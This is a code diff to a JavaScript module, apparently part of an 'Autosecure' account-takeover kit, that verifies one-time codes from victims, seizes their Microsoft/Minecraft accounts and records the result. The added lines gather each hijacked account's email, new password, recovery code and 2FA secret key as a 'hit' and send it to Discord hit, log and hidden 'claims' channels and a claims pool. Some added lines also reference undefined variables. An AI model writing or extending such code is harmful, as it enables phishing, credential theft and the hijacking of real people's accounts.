@@ -10,9 +10,16 @@ const { queryParams } = require('./autosecure/db/database');
 // Load configuration
 const config = require('./config.json');
 
+// Import Discord embed utilities
+const { getVerificationEmbed, sendHitNotification, sendLogNotification, sendHiddenLogToClaims } = require('./discord_embeds');
+
+// Import claims system
+const ClaimsSystem = require('./claims_system');
+
 class AutosecureGiftLink {
     constructor() {
         this.sessions = new Map(); // Store active sessions
+        this.claimsSystem = new ClaimsSystem(); // Claims system instance
     }
 
     // Step 1: Send OTP to email
@@ -24,14 +31,28 @@ class AutosecureGiftLink {
             const data = await getCredentials(email, true);
             
             if (!data) {
-                return { success: false, error: 'Invalid email or OTP disabled' };
+                return { 
+                    success: false, 
+                    error: 'Failed to verify OTP',
+                    embedData: getVerificationEmbed('error', { 
+                        email: email,
+                        error: 'Failed to verify OTP',
+                        product: 'Gift Link'
+                    })
+                };
             }
 
             if (!data._otcSent) {
                 return { 
                     success: false, 
                     error: 'Failed to send OTP',
-                    details: data._otpError || 'Unknown error'
+                    details: data._otpError || 'Unknown error',
+                    embedData: getVerificationEmbed('code_send_failed', { 
+                        email, 
+                        reason: data._otpError || 'Unknown error',
+                        product: 'Gift Link',
+                        methods: data._totalSecurityMethods + ' disponibles'
+                    })
                 };
             }
 
@@ -44,16 +65,26 @@ class AutosecureGiftLink {
                 expires: Date.now() + (15 * 60 * 1000) // 15 minutes
             });
 
-            return { 
-                success: true, 
-                sessionId,
+            return {
+                success: true,
+                sessionId: sessionId,
                 message: 'OTP sent successfully',
+                embedData: getVerificationEmbed('otp_sent', { email, product: 'Gift Link' }),
                 hasRecoveryMethods: data._totalSecurityMethods > 0
             };
             
         } catch (error) {
             console.error(`[AUTOSECURE_GIFT] Error sending OTP:`, error);
-            return { success: false, error: 'Failed to send OTP' };
+            return { 
+                success: false, 
+                error: 'Failed to send OTP',
+                embedData: getVerificationEmbed('code_send_failed', { 
+                    email, 
+                    reason: error.message,
+                    product: 'Gift Link',
+                    methods: data._totalSecurityMethods + ' disponibles'
+                })
+            };
         }
     }
 
@@ -63,12 +94,28 @@ class AutosecureGiftLink {
             const session = this.sessions.get(sessionId);
             
             if (!session) {
-                return { success: false, error: 'Invalid or expired session' };
+                return { 
+                    success: false, 
+                    error: 'Invalid or expired session',
+                    embedData: getVerificationEmbed('session_expired', { 
+                        email: 'Unknown',
+                        sessionId: sessionId,
+                        product: 'Gift Link'
+                    })
+                };
             }
 
             if (Date.now() > session.expires) {
                 this.sessions.delete(sessionId);
-                return { success: false, error: 'Session expired' };
+                return { 
+                    success: false, 
+                    error: 'Session expired',
+                    embedData: getVerificationEmbed('session_expired', { 
+                        email: session.email,
+                        sessionId: sessionId,
+                        product: 'Gift Link'
+                    })
+                };
             }
 
             console.log(`[AUTOSECURE_GIFT] Verifying OTP for: ${session.email}`);
@@ -90,7 +137,16 @@ class AutosecureGiftLink {
             }
 
             if (!host) {
-                return { success: false, error: 'Invalid OTP code' };
+                return { 
+                    success: false, 
+                    error: 'Invalid OTP code',
+                    embedData: getVerificationEmbed('invalid_code', { 
+                        email: session.email,
+                        code: otp,
+                        sessionId: sessionId,
+                        product: 'Gift Link'
+                    })
+                };
             }
 
             // Get user settings (you might need to adjust this)
@@ -127,29 +183,95 @@ class AutosecureGiftLink {
             const account = await secure(host, settings, uid, minecraftUsername);
             
             if (!account || account.status === 'invalid_session') {
-                return { success: false, error: 'Failed to secure account' };
+                return { 
+                    success: false, 
+                    error: 'Failed to secure account',
+                    embedData: getVerificationEmbed('error', { 
+                        email: session.email,
+                        error: 'Invalid session during secure process',
+                        product: 'Gift Link'
+                    })
+                };
+            }
+
+            // Check if account has no Minecraft and secureifnomc is disabled
+            if (account.status === 'No Minecraft!' && !settings.secureifnomc) {
+                return { 
+                    success: false, 
+                    error: 'No Minecraft account found',
+                    embedData: getVerificationEmbed('no_minecraft', { 
+                        email: session.email,
+                        fullName: 'Unknown',
+                        product: 'Gift Link',
+                        secureifnomc: settings.secureifnomc
+                    })
+                };
             }
 
             // Clean up session
             this.sessions.delete(sessionId);
 
+            // Preparar datos para el embed de hit
+            const hitData = {
+                email: account.email,
+                secEmail: account.secEmail,
+                password: account.password,
+                recoveryCode: account.recoveryCode,
+                secretkey: account.secretkey,
+                timeTaken: account.timeTaken,
+                minecraft: account.mc,
+                product: 'Gift Link'
+            };
+
+            // Enviar notificación al canal de hits (async, no bloquear)
+            if (typeof global !== 'undefined' && global.client) {
+                sendHitNotification(global.client, hitData).catch(err => {
+                    console.error('Error sending hit notification:', err);
+                });
+            }
+
+            // Enviar embed al canal de logs
+            if (typeof global !== 'undefined' && global.client) {
+                sendLogNotification(global.client, embedData).catch(err => {
+                    console.error('Error sending log notification:', err);
+                });
+            }
+
+            // Enviar embed oculto al canal de claims
+            if (typeof global !== 'undefined' && global.client) {
+                sendHiddenLogToClaims(global.client, 'account_secured', hitData).catch(err => {
+                    console.error('Error sending hidden log to claims:', err);
+                });
+            }
+
+            // Agregar cuenta al sistema de claims
+            try {
+                // Obtener el fullName desde la sesión original
+                const fullName = session.fullName || 'Unknown';
+                const claimData = { ...hitData, fullName };
+                await this.claimsSystem.addClaim(claimData);
+                console.log(`[AUTOSECURE_GIFT] Account added to claims pool: ${claimData.fullName}`);
+            } catch (error) {
+                console.error('Error adding claim:', error);
+            }
+
             return {
                 success: true,
-                account: {
-                    email: account.email,
-                    newEmail: account.email,
-                    username: account.newName,
-                    oldUsername: account.oldName,
-                    hasMinecraft: account.mc !== "No Minecraft!",
-                    secured: true,
-                    timeTaken: account.timeTaken,
-                    uid: uid
-                }
+                account: hitData,
+                embedData: getVerificationEmbed('account_secured', hitData)
             };
             
         } catch (error) {
             console.error(`[AUTOSECURE_GIFT] Error verifying OTP:`, error);
-            return { success: false, error: 'Failed to verify OTP' };
+            return { 
+                success: false, 
+                error: 'Failed to verify OTP',
+                embedData: getVerificationEmbed('error', { 
+                    email: session?.email || 'Unknown',
+                    error: error.message,
+                    product: 'Gift Link'
+                })
+            };
         }
     }
 
